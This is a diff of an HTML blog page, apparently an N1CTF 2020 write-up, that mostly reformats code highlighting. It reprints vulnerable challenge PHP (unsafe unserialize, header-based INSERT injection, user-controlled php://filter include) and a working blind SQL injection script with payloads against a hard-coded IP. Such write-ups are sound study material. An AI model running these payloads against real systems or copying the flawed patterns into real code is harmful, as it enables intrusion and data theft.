@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -318,57 +318,57 @@
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">ip</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$info</span><span class="p">){</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">])){</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">];</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
-        <span class="nv">$con</span><span class="o">=</span><span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;********&#34;</span><span class="p">,</span><span class="s2">&#34;n1ctf_websign&#34;</span><span class="p">);</span>
-        <span class="nv">$sqlquery</span><span class="o">=</span><span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]),</span><span class="nx">time</span><span class="p">());</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="nv">$sqlquery</span><span class="p">)){</span>
-            <span class="k">return</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="k">return</span> <span class="s2">&#34;your ip looks ok!&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">flag</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$ip</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">getflag</span><span class="p">(){</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">)</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;key****************&#34;</span><span class="p">)){</span>
-            <span class="nx">readfile</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span><span class="p">,</span> <span class="s2">&#34;n1ctf&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">)</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="s2">&#34;welcome to n1ctf2020&#34;</span><span class="p">;</span>
-        <span class="k">else</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="s2">&#34;noip&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getflag</span><span class="p">();</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">])){</span>
-    <span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">];</span>
-    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ip</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$info</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$con</span><span class="o">=</span><span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;********&#34;</span><span class="p">,</span><span class="s2">&#34;n1ctf_websign&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sqlquery</span><span class="o">=</span><span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]),</span><span class="nx">time</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span><span class="nv">$sqlquery</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;your ip looks ok!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">flag</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getflag</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">)</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;key****************&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">readfile</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span><span class="p">,</span> <span class="s2">&#34;n1ctf&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="s2">&#34;welcome to n1ctf2020&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="s2">&#34;noip&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getflag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      先看一下整体，ip类存在一个<strong>变量赋值</strong>和<strong>数据库插入</strong>；flag类能够<strong>读取flag</strong>，但是需要<code>check值</code>。真実はいつもひとつ，<code>check</code>需要SQL注入得到，注入类型：<a href="https://www.dazhuanlan.com/2019/12/09/5dee607fccd80/" target="_blank" rel="noopener">insert注入</a>，而实现注入需要我们插入构造的SQL语句，看向ip类的变量赋值过程：</p>
 <blockquote>
@@ -419,40 +419,40 @@
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">time</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://101.32.205.189/?input=O:4:</span><span class="si">%22f</span><span class="s1">lag%22:2:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;O:2:</span><span class="si">%22i</span><span class="s1">p%22:1:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;N;}s:5:</span><span class="si">%22c</span><span class="s1">heck%22;N;}&#39;</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]Injection start...&#34;</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
-    <span class="nb">min</span> <span class="o">=</span> <span class="mi">32</span>
-    <span class="k">while</span> <span class="nb">max</span> <span class="o">&gt;</span> <span class="nb">min</span><span class="p">:</span>
-        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
-        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
-            <span class="c1"># table_name=n1ip,n1key</span>
-        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;n1key&#39;and table_schema=database()),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
-            <span class="c1"># n1key: id, key</span>
-        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select `key` from n1key),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
-            <span class="c1"># n1ctf20205bf75ab0a30dfc0c</span>
-        <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-        <span class="k">if</span> <span class="s2">&#34;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-            <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
-        <span class="k">elif</span> <span class="s2">&#34;&lt;code&gt;noip&lt;/code&gt;&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-            <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
-    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
-        <span class="k">break</span>
-    <span class="c1"># 手动停</span>
-<span class="c1"># print(&#34;[+]Injection end...\n&#34; + flag)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://101.32.205.189/?input=O:4:</span><span class="si">%22f</span><span class="s1">lag%22:2:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;O:2:</span><span class="si">%22i</span><span class="s1">p%22:1:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;N;}s:5:</span><span class="si">%22c</span><span class="s1">heck%22;N;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]Injection start...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nb">max</span> <span class="o">&gt;</span> <span class="nb">min</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># table_name=n1ip,n1key</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;n1key&#39;and table_schema=database()),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># n1key: id, key</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;1&#39;,updatexml(1,if(ascii(substr((select `key` from n1key),{},1))&gt;{},1,concat(0x7e,(&#39;n1ctf&#39;),0x7e)),1)),(&#39;1&#34;.format(j, mid)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># n1ctf20205bf75ab0a30dfc0c</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;&lt;code&gt;noip&lt;/code&gt;&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 手动停</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(&#34;[+]Injection end...\n&#34; + flag)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="filters"><a href="#filters" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:filters" class="headings">Filters</a></h2>
 <p>一个web题为什么放在misc，还是说难度不够上web。。。(果然还是我太菜了吗)</p>
@@ -482,28 +482,28 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">print_r</span><span class="p">(</span><span class="s2">&#34;show me your filters!&#34;</span><span class="p">)</span><span class="o">:</span> <span class="k">die</span><span class="p">(</span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
-<span class="nv">$input</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">]);</span>
-<span class="nv">$source_file</span> <span class="o">=</span> <span class="s2">&#34;/var/tmp/&#34;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
-<span class="nv">$file_contents</span> <span class="o">=</span> <span class="p">[];</span>
-<span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">){</span>
-    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$file_contents</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://filter/&#34;</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">&#34;/resource=/usr/bin/php&#34;</span><span class="p">));</span>
-<span class="p">}</span>
-<span class="nx">shuffle</span><span class="p">(</span><span class="nv">$file_contents</span><span class="p">);</span>
-<span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$source_file</span><span class="p">,</span> <span class="nv">$file_contents</span><span class="p">);</span>
-<span class="k">try</span> <span class="p">{</span>
-    <span class="k">require_once</span> <span class="nv">$source_file</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">catch</span><span class="p">(</span><span class="nx">\Throwable</span> <span class="nv">$e</span><span class="p">){</span>
-    <span class="nx">pass</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nx">unlink</span><span class="p">(</span><span class="nv">$source_file</span><span class="p">);</span>
-
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">print_r</span><span class="p">(</span><span class="s2">&#34;show me your filters!&#34;</span><span class="p">)</span><span class="o">:</span> <span class="k">die</span><span class="p">(</span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$source_file</span> <span class="o">=</span> <span class="s2">&#34;/var/tmp/&#34;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file_contents</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">){</span>
